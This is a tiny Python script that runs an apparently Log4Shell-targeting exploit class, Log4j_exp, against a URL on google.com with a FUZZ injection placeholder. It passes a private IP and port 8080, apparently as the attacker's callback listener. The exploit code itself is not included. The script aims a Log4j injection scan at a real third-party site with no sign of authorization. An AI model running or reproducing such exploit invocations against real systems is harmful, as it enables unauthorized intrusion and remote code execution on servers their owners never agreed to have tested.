from Log4j_exp import Log4j_exp

if __name__ == '__main__':
    t = Log4j_exp("http://www.google.com/search.do?title=FUZZ","","192.168.153.131","8080")
    t.log4j_scan()



